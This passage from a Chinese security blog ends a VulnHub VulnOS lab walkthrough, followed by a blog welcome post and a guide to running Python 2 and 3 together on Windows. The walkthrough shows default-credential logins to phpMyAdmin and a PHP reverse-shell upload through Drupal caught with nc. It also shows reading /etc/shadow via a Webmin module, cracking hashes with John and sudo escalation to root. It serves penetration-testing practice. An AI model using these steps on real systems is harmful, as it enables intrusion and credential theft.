<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(unix/misc/distcc_exec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 192.168.56.102:3456 </span><br><span class="line">[-] 192.168.56.124:3632 - Exploit failed [disconnected]: Errno::ECONNRESET Connection reset by peer</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>

<p>不知怎么回事，利用不了这个漏洞，可能是漏洞太古老，太久远了，只能尝试其他方法了。</p>
<p>非典型情况-许多端口是开放的。<br>更喜欢从快速验证（例如MySQL默认帐户，NFS等）开始，进行深度渗透测试。<br>试图使用默认凭据（例如root：root，root：toor，root：password，root：mysql）登录MySQL服务器。不幸的是没有成功。还检查了NFS，但没有好消息…</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># rpcinfo -p 192.168.56.124</span></span><br><span class="line">   program vers proto   port  service</span><br><span class="line">    100000    2   tcp    111  portmapper</span><br><span class="line">    100000    2   udp    111  portmapper</span><br><span class="line">    100024    1   udp  60680  status</span><br><span class="line">    100024    1   tcp  40626  status</span><br><span class="line">    100021    1   udp  38218  nlockmgr</span><br><span class="line">    100021    3   udp  38218  nlockmgr</span><br><span class="line">    100021    4   udp  38218  nlockmgr</span><br><span class="line">    100021    1   tcp  44108  nlockmgr</span><br><span class="line">    100021    3   tcp  44108  nlockmgr</span><br><span class="line">    100021    4   tcp  44108  nlockmgr</span><br><span class="line">    100003    2   udp   2049  nfs</span><br><span class="line">    100003    3   udp   2049  nfs</span><br><span class="line">    100003    4   udp   2049  nfs</span><br><span class="line">    100003    2   tcp   2049  nfs</span><br><span class="line">    100003    3   tcp   2049  nfs</span><br><span class="line">    100003    4   tcp   2049  nfs</span><br><span class="line">    100005    1   udp  55441  mountd</span><br><span class="line">    100005    1   tcp  33014  mountd</span><br><span class="line">    100005    2   udp  55441  mountd</span><br><span class="line">    100005    2   tcp  33014  mountd</span><br><span class="line">    100005    3   udp  55441  mountd</span><br><span class="line">    100005    3   tcp  33014  mountd</span><br><span class="line">root@kali:~<span class="comment"># showmount -e 192.168.56.124</span></span><br><span class="line">Export list <span class="keyword">for</span> 192.168.56.124:</span><br></pre></td></tr></table></figure>

<p>尝试使用OpenSSH。进行了大量研究，发现一些专门用于OpenSSH &lt;= 5.3的漏洞利用，但是它不起作用。</p>
<ul>
<li><img src="https://3.bp.blogspot.com/-Pe7E17cUN_Y/V2uK6vvqgnI/AAAAAAAABdY/DJf0tqzFYc0tCl48ZT2SADUWlF6vx5_KwCLcB/s1600/exp.png"></li>
</ul>
<p>好的，现在轮到Web浏览。默认网页如下所示</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub258.jpg"></li>
</ul>
<p>源代码也不包含任何有用的信息。单击被转发到的链接</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub259.jpg"></li>
</ul>
<p>嗯，也没什么有用的东西。应该记住，端口80不仅是一个开放的http端口。运行dirbuster爆破目录试试</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub260.jpg"></li>
</ul>
<p>该目标使用Apache 2.2.14，它存在公共漏洞利用程序（CVE-2010-0425）。Metasploit具有专用于此版本的辅助模块。但是，现在只想在没有其他方法的情况下使用metasploit。</p>
<p>Dirbuster发现该Web应用程序还具有phpmyadmin面板。因此，请尝试使用默认凭据登录，如root/toor。答对了！</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub261.jpg"></li>
</ul>
<p>以root身份成功登录！很好。尝试从/etc/shadow加载数据，但与/etc/passwd相反（可能权限不足）没有成功。</p>
<ul>
<li><img src="https://1.bp.blogspot.com/-RFOIgH37Zno/V2uVUZEaH6I/AAAAAAAABeY/f5ttDoTmHOUaAGrMkpVCkgHRhCVIr_73wCLcB/s1600/passwd.png"></li>
</ul>
<p>有系统用户的完整列表。尝试使用outfile语句创建phpinfo文件，但未成功。</p>
<p>检查一下可以从数据库中检索到什么在Drupal6数据库中，可以找到</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub262.jpg"></li>
</ul>
<p>好！但是必须破解这些hash。在mysql数据库中，可以找到以下凭证</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub263.jpg"></li>
</ul>
<p>非常好，因为拥有与/etc/passwd文件中部分相同的用户名。破解了几个密码，例如drupal6密码drupal6。所以，现在专注于Drupal</p>
<p>浏览器访问下面的url并使用drupal6/drupal6登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.124/drupal6/</span><br></pre></td></tr></table></figure>

<p>现在，必须找到上传PHP后门的地方。在《Administer》中，添加允许扩展的php和phtml。创建了帖子并附加了PHP后门。成功上传phtml后门文件，然后点击它…</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub264.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub265.jpg"></p>
</li>
</ul>
<p>访问shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.124/drupal6/sites/default/files/phpreverseshell2.phtml</span><br></pre></td></tr></table></figure>

<p>然后kali端使用nc监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.124: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.124] 56444</span><br><span class="line">Linux VulnOS 2.6.32-57-generic-pae <span class="comment">#119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux</span></span><br><span class="line"> 05:30:10 up  1:05,  0 users,  load average: 0.03, 0.05, 0.34</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/</span></span><br></pre></td></tr></table></figure>

<p>优秀！获得了有限制的shell！检查了目标操作系统，并找到Ubuntu 10.04。不幸的是，每项攻击都行不通。花了很多时间寻找一些“秘密”文件，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /etc/nagios3/htpasswd.users</span><br><span class="line">nagiosadmin:8A86JOBWoCwnk</span><br></pre></td></tr></table></figure>

<p>将/etc/passwd文件中的用户名作为字典列表，可能会有帮助。尝试使用john破解此密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnos-1<span class="comment"># john pass --wordlist=/root/vulnhub/vulnos-1/wordlist</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (descrypt, traditional crypt(3) [DES 256/256 AVX2])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">Warning: Only 44 candidates left, minimum 1024 needed <span class="keyword">for</span> performance.</span><br><span class="line">canuhack         (nagiosadmin)</span><br><span class="line">1g 0:00:00:00 DONE (2020-04-17 03:25) 100.0g/s 4400p/s 4400c/s 4400C/s root..canuhack</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>很遗憾，没有nagiosadmin用户。/etc/passwd中的用户名为hackme，所以也许应该为canuhackme作为用户密码？</p>
<p>使用msf的auxiliary/admin/webmin/file_disclosure模块尝试读取/etc/shadow文件内容</p>
<p>然后将canuhackme添加到字典中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/admin/webmin/file_disclosure):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting   Required  Description</span><br><span class="line">   ----     ---------------   --------  -----------</span><br><span class="line">   DIR      /unauthenticated  yes       Webmin directory path</span><br><span class="line">   Proxies                    no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS   192.168.56.124    yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPATH    /etc/shadow       yes       The file to download</span><br><span class="line">   RPORT    10000             yes       The target port (TCP)</span><br><span class="line">   SSL      <span class="literal">false</span>             no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   VHOST                      no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name      Description</span><br><span class="line">   ----      -----------</span><br><span class="line">   Download  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(admin/webmin/file_disclosure) &gt; run</span><br><span class="line">[*] Running module against 192.168.56.124</span><br><span class="line"></span><br><span class="line">[*] Attempting to retrieve /etc/shadow...</span><br><span class="line">[*] The server returned: 200 Document follows</span><br><span class="line">root:*:16137:0:99999:7:::</span><br><span class="line">daemon:*:16137:0:99999:7:::</span><br><span class="line">bin:*:16137:0:99999:7:::</span><br><span class="line">sys:*:16137:0:99999:7:::</span><br><span class="line">sync:*:16137:0:99999:7:::</span><br><span class="line">games:*:16137:0:99999:7:::</span><br><span class="line">man:*:16137:0:99999:7:::</span><br><span class="line">lp:*:16137:0:99999:7:::</span><br><span class="line">mail:*:16137:0:99999:7:::</span><br><span class="line">news:*:16137:0:99999:7:::</span><br><span class="line">uucp:*:16137:0:99999:7:::</span><br><span class="line">proxy:*:16137:0:99999:7:::</span><br><span class="line">www-data:*:16137:0:99999:7:::</span><br><span class="line">backup:*:16137:0:99999:7:::</span><br><span class="line">list:*:16137:0:99999:7:::</span><br><span class="line">irc:*:16137:0:99999:7:::</span><br><span class="line">gnats:*:16137:0:99999:7:::</span><br><span class="line">nobody:*:16137:0:99999:7:::</span><br><span class="line">libuuid:!:16137:0:99999:7:::</span><br><span class="line">syslog:*:16137:0:99999:7:::</span><br><span class="line">landscape:*:16137:0:99999:7:::</span><br><span class="line">vulnosadmin:<span class="variable">$6</span><span class="variable">$SLXu95CH</span><span class="variable">$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p</span>.xbnSVJFAeg1WO28ljNAPrlXaghLmo/:16137:0:99999:7:::</span><br><span class="line">sysadmin:admin:16137:0:99999:7:::</span><br><span class="line">webmin:webmin:16137:0:99999:7:::</span><br><span class="line">hackme:hackme:16137:0:99999:7:::</span><br><span class="line">sa:password1:16137:0:99999:7:::</span><br><span class="line">stupiduser:stupiduser:16137:0:99999:7:::</span><br><span class="line">messagebus:*:16137:0:99999:7:::</span><br><span class="line">distccd:*:16137:0:99999:7:::</span><br><span class="line">sshd:*:16138:0:99999:7:::</span><br><span class="line">openldap:!:16138:0:99999:7:::</span><br><span class="line">ftp:!:16138:0:99999:7:::</span><br><span class="line">mysql:!:16138:0:99999:7:::</span><br><span class="line">telnetd:*:16138:0:99999:7:::</span><br><span class="line"><span class="built_in">bind</span>:*:16138:0:99999:7:::</span><br><span class="line">postgres:*:16138:0:99999:7:::</span><br><span class="line">postfix:*:16138:0:99999:7:::</span><br><span class="line">dovecot:*:16138:0:99999:7:::</span><br><span class="line">tomcat6:*:16138:0:99999:7:::</span><br><span class="line">statd:*:16138:0:99999:7:::</span><br><span class="line">snmp:*:16138:0:99999:7:::</span><br><span class="line">nagios:!:16140:0:99999:7:::</span><br><span class="line">openerp:*:16140:0:99999:7:::</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>再次使用john加载字典进行破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/vulnos-1<span class="comment"># cat pass2</span></span><br><span class="line">vulnosadmin:<span class="variable">$6</span><span class="variable">$SLXu95CH</span><span class="variable">$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p</span>.xbnSVJFAeg1WO28ljNAPrlXaghLmo/root@kali:~/vulnhub/vulnos-1<span class="comment"># john pass2 --wordlist=/root/vulnhub/vulnos-1/wordlist</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (sha512crypt, crypt(3) <span class="variable">$6</span>$ [SHA512 256/256 AVX2 4x])</span><br><span class="line">Cost 1 (iteration count) is 5000 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">canuhackme       (vulnosadmin)</span><br><span class="line">1g 0:00:00:00 DONE (2020-04-17 03:52) 50.00g/s 2200p/s 2200c/s 2200C/s root..canuhackme</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>得到ssh登录用户名：vulnosadmin，密码：canuhackme</p>
<h3 id="登录并提权"><a href="#登录并提权" class="headerlink" title="登录并提权"></a>登录并提权</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh vulnosadmin@192.168.56.124</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;/root/.ssh/id_rsa&#x27;</span>: </span><br><span class="line">vulnosadmin@192.168.56.124<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux</span></span><br><span class="line"><span class="string">Ubuntu 10.04.4 LTS</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Welcome to Ubuntu!</span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Fri Apr 17 09:55:15 CEST 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.0                Processes:           141</span></span><br><span class="line"><span class="string">  Usage of /:   16.3% of 23.06GB   Users logged in:     0</span></span><br><span class="line"><span class="string">  Memory usage: 38%                IP address for eth0: 192.168.56.124</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Graph this data and manage this system at:</span></span><br><span class="line"><span class="string">    https://landscape.canonical.com/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">New release &#x27;</span>precise<span class="string">&#x27; available.</span></span><br><span class="line"><span class="string">Run &#x27;</span><span class="keyword">do</span>-release-upgrade<span class="string">&#x27; to upgrade to it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Mar 19 17:31:44 2014 from 192.168.1.3</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOS:~$ id</span></span><br><span class="line"><span class="string">uid=1000(vulnosadmin) gid=1000(vulnosadmin) groepen=4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin),1000(vulnosadmin)</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOS:~$ whoami</span></span><br><span class="line"><span class="string">vulnosadmin</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOS:~$ sudo -l</span></span><br><span class="line"><span class="string">[sudo] password for vulnosadmin: </span></span><br><span class="line"><span class="string">Matching Defaults entries for vulnosadmin on this host:</span></span><br><span class="line"><span class="string">    env_reset</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User vulnosadmin may run the following commands on this host:</span></span><br><span class="line"><span class="string">    (ALL) ALL</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOS:~$ su</span></span><br><span class="line"><span class="string">Wachtwoord: </span></span><br><span class="line"><span class="string">su: Authenticatie fout</span></span><br><span class="line"><span class="string">vulnosadmin@VulnOS:~$ sudo su</span></span><br><span class="line"><span class="string">root@VulnOS:/home/vulnosadmin# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groepen=0(root)</span></span><br><span class="line"><span class="string">root@VulnOS:/home/vulnosadmin# whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string">root@VulnOS:/home/vulnosadmin# cd /root</span></span><br><span class="line"><span class="string">root@VulnOS:~# ls</span></span><br><span class="line"><span class="string">hello.txt</span></span><br><span class="line"><span class="string">root@VulnOS:~# cat hello.txt </span></span><br><span class="line"><span class="string">Hello,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">So you got root... You still need to find the rest of the vulnerabilities inside the OS !</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRY HARDER !!!!!!!</span></span><br></pre></td></tr></table></figure>

<p>成功登录，提权到root然后拿到了flag</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub266.jpg"></li>
</ul>
<p><font color="red">注意，此靶机的漏洞非常多，在此不一一尝试了，有兴趣自己去尝试，有新的方法可以联系我QQ:1185151867。</font></p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>msf exploit/unix/misc/distcc_exec 模块利用distcc漏洞getshell</li>
<li>phpmyadmin弱口令</li>
<li>Drupal修改配置项上传phtml shell</li>
<li>john加载/etc/passwd用户名字典破解hash密码</li>
<li>msf auxiliary/admin/webmin/file_disclosure模块读取/etc/shadow文件内容</li>
<li>sudo su 然后输入密码提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>欢迎来到lucifer11的博客</title>
    <url>/2018/12/06/welcome-to-lucifer11&#39;s-blog/</url>
    <content><![CDATA[<p><font color="blue"><strong>*Welcome to lucifer11’s Blog! This is my first hexo blog. Thanks for jiyili told me about this. If you get any problems when reading my blog, you can tell me on QQ:1185151867 or you can ask me on <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">GitHub<i class="fa fa-external-link-alt"></i></span>.<br>*</strong></font></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="关于本博客"><a href="#关于本博客" class="headerlink" title="关于本博客"></a>关于本博客</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">本博客是纯技术博客，记录我在学习成长过程中的一些技术。</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p><em>友情博客</em>: <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==">记忆里的纯真<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="本博客所涉及的内容与领域"><a href="#本博客所涉及的内容与领域" class="headerlink" title="本博客所涉及的内容与领域"></a>本博客所涉及的内容与领域</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">硬件安全，软件安全，无线电安全，人工智能AI，各种计算机编程语言，等等。。。</span><br></pre></td></tr></table></figure>

<p>本人的另一个博客: <span class="exturl" data-url="aHR0cHM6Ly80bHVjaWZlci53b3JkcHJlc3MuY29tLw==">LUCIFER的个人技术博客<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="关于本人"><a href="#关于本人" class="headerlink" title="关于本人"></a>关于本人</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">本人就一骨灰级死宅，喜爱钻研各种技术，当然，包括计算机以外的技术。</span><br></pre></td></tr></table></figure>
<h3 id="如果你也热爱各种技术"><a href="#如果你也热爱各种技术" class="headerlink" title="如果你也热爱各种技术"></a>如果你也热爱各种技术</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">本人很荣幸和您一起讨论技术！</span><br></pre></td></tr></table></figure>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">欢迎各位大神的宝贵意见，请在下方评论即可！</span><br></pre></td></tr></table></figure>
<h3 id="博主QQ：1185151867"><a href="#博主QQ：1185151867" class="headerlink" title="博主QQ：1185151867"></a><em>博主QQ</em>：1185151867</h3><h4 id="特别感谢：记忆里的纯真"><a href="#特别感谢：记忆里的纯真" class="headerlink" title="特别感谢：记忆里的纯真"></a><em>特别感谢</em>：记忆里的纯真</h4><p><img src="/images/redflower.jpg" alt="绯红的彼岸花"></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 博主是大佬</li>
<li><input checked="" disabled="" type="checkbox"> 博主是帅比</li>
<li><input checked="" disabled="" type="checkbox"> 博主是菜鸟</li>
<li><input checked="" disabled="" type="checkbox"> 博主是骨灰级死宅</li>
<li><input checked="" disabled="" type="checkbox"> 博主没人要了</li>
</ul>
]]></content>
      <categories>
        <category>开篇介绍</category>
      </categories>
      <tags>
        <tag>开篇介绍</tag>
      </tags>
  </entry>
  <entry>
    <title>windows同时安装python2和python3</title>
    <url>/2019/12/11/windowspy23/</url>
    <content><![CDATA[<p>（本文仅作记录以备忘）</p>
<p><font color="green">Python 软件基金会宣布，到 2020 年元旦，将不再为编程语言 Python 2.x 分支提供任何支持。这一天将标志着一出延续多年的戏剧的高潮：Python 从较旧的、功能较弱的、广泛使用的版本过渡到更新的、更强大的版本。然而，Python 的新版本在采用上仍然落后于它的旧版本。未来几年里，还会有很多人继续使用 Python 2 编写的程序,有些python程序使用python2开发的，比如sqlmap，与 Python 2 相比，Python 3 有着无数的技术和最终用户增强功能，但却未能永久取代 Python 2。PyPI 存储库中托管的大多数流行包都支持 Python 3（该库是可重用 Python 代码的第一站）。Python 3 现在已经成为许多 Linux 发行版默认的 Python 解释器。大多数最近出版的书籍、编码学院（coding academy）和在线课程都向初学者推荐了 Python 3。也有的程序是python3开发的就造成了运行不同的python程序需要切换不同的python版本的问题，下面是如何让python2和python3在同一windows操作系统上共存的问题。</font></p>
<p>本人再网上搜索了大量文章后，有的文章是同时安装python2和python3，但是此种方法有些复杂，而且出错了也不好解决，创建虚拟环境还需要很多命令，使用完还需要删除虚拟环境，还要改python.exe的名字，还要折腾pip，经过对比与总结，发现下面的操作方法最为实用可靠，命令也少。</p>
<a id="more"></a>

<p>我电脑之前已经安装了python2.7的环境，就不卸载了，下面到Anaconda的官网下载Python 3.7 version，<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5hY29uZGEuY29tL2Rpc3RyaWJ1dGlvbi8jZG93bmxvYWQtc2VjdGlvbg==">windows版下载地址：<i class="fa fa-external-link-alt"></i></span></p>
<p>下载完成后，安装过程不再赘述，安装时要注意：</p>
<ul>
<li>1.配置环境变量。一定要勾选 Add Anaconda to my PATH environment variable，将 Anaconda 添加到环境变量。</li>
<li>2.将 Anaconda 设为默认的 Python 环境。勾选 Register Anaconda as my default Python 3.7。</li>
</ul>
<p>如下命令说明安装成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;conda --version</span><br><span class="line">conda 4.7.12</span><br></pre></td></tr></table></figure>

<p>下面来配置，让两个版本的python和pip可以共存在windows上。</p>
<ul>
<li>进入python2.7的目录</li>
</ul>
<p>将python.exe改为python2.exe</p>
<p>然后运行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;python2 -m pip install --upgrade pip --force-reinstall</span><br><span class="line">DEPRECATION: Python 2.7 will reach the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 won<span class="string">&#x27;t be maintained after that date. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support</span></span><br><span class="line"><span class="string">Collecting pip</span></span><br><span class="line"><span class="string">  Using cached https://files.pythonhosted.org/packages/00/b6/9cfa56b4081ad13874b0c6f96af8ce16cfbc1cb06bedf8e9164ce5551ec1/pip-19.3.1-py2.py3-none-any.whl</span></span><br><span class="line"><span class="string">Installing collected packages: pip</span></span><br><span class="line"><span class="string">  Found existing installation: pip 19.3.1</span></span><br><span class="line"><span class="string">    Uninstalling pip-19.3.1:</span></span><br><span class="line"><span class="string">      Successfully uninstalled pip-19.3.1</span></span><br><span class="line"><span class="string">Successfully installed pip-19.3.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\Users\HASEE&gt;python -m pip install --upgrade pip --force-reinstall</span></span><br><span class="line"><span class="string">Collecting pip</span></span><br><span class="line"><span class="string">  Using cached https://files.pythonhosted.org/packages/00/b6/9cfa56b4081ad13874b0c6f96af8ce16cfbc1cb06bedf8e9164ce5551ec1/pip-19.3.1-py2.py3-none-any.whl</span></span><br><span class="line"><span class="string">Installing collected packages: pip</span></span><br><span class="line"><span class="string">  Found existing installation: pip 19.3.1</span></span><br><span class="line"><span class="string">    Uninstalling pip-19.3.1:</span></span><br><span class="line"><span class="string">      Successfully uninstalled pip-19.3.1</span></span><br><span class="line"><span class="string">Successfully installed pip-19.3.1</span></span><br></pre></td></tr></table></figure>

<p>然后测试是否成功共存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;pip2 --version</span><br><span class="line">pip 19.3.1 from d:\python27\lib\site-packages\pip (python 2.7)</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE&gt;pip3 --version</span><br><span class="line">pip 19.3.1 from d:\anaconda3\lib\site-packages\pip (python 3.7)</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE&gt;python2</span><br><span class="line">Python 2.7.16 (v2.7.16:413a49145e, Mar  4 2019, 01:37:19) [MSC v.1500 64 bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE&gt;python</span><br><span class="line">Python 3.7.4 (default, Aug  9 2019, 18:34:13) [MSC v.1915 64 bit (AMD64)] :: Anaconda, Inc. on win32</span><br><span class="line"></span><br><span class="line">Warning:</span><br><span class="line">This Python interpreter is <span class="keyword">in</span> a conda environment, but the environment has</span><br><span class="line">not been activated.  Libraries may fail to load.  To activate this environment</span><br><span class="line">please see https://conda.io/activation</span><br><span class="line"></span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>测试成功，两个版本的python成功共存。</p>
<p>使用此种方法配置，不但可以共存还可以使用conda在虚拟环境中配置python</p>
<p>如果报以下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;virtualenv</span><br><span class="line">Fatal error <span class="keyword">in</span> launcher: Unable to create process using <span class="string">&#x27;&quot;d:\python27\python.exe&quot;  &quot;D:\Python27\Scripts\virtualenv.exe&quot; </span></span><br></pre></td></tr></table></figure>

<p>运行如下命令即可解决：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;python -m pip install --upgrade virtualenv</span><br><span class="line">Collecting virtualenv</span><br><span class="line">  Downloading https://files.pythonhosted.org/packages/62/77/6a86ef945ad39aae34aed4cc1ae4a2f941b9870917a974ed7c5b6f137188/virtualenv-16.7.8-py2.py3-none-any.whl (3.4MB)</span><br><span class="line">     |████████████████████████████████| 3.4MB 467kB/s</span><br><span class="line">Installing collected packages: virtualenv</span><br><span class="line">Successfully installed virtualenv-16.7.8</span><br></pre></td></tr></table></figure>
<p>成功解决</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;virtualenv --version</span><br><span class="line">16.7.8</span><br></pre></td></tr></table></figure>

<p>Anaconda使用参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9mb29maXNoLm5ldC9jb21wYXRpYmxlLXB5Mi1hbmQtcHkzLmh0bWw=">用 Anaconda 完美解决 Python2 和 python3 共存问题<i class="fa fa-external-link-alt"></i></span></p>
<p>长舒一口气，真是太兴奋了！！！</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<h4 id="THE-END"><a href="#THE-END" class="headerlink" title="THE END"></a>THE END</h4>]]></content>
      <categories>
